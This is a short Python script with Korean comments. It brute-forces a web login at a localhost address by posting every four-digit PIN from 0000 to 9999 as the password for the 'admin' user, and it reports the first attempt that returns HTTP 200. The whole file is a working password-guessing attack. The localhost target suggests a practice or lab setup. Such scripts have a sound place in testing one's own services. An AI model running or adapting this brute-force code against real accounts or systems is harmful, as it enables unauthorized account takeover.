import requests

# 대상 URL 설정
url = "http://localhost:5000/login"

# brute-force로 로그인 시도
for i in range(10000):  # 0000부터 9999까지
    password = f"{i:04d}"  # 숫자를 4자리 문자열로 포맷 (ex: 0000, 0001, ..., 9999)
    data = {
        "username": "admin",
        "password": password
    }

    # 요청 보내기
    response = requests.post(url, data=data)

    # 응답 확인
    if response.status_code == 200:
        print(f"[SUCCESS] Password found: {password}")
        break
    else:
        print(f"[FAILED] Tried password: {password}")
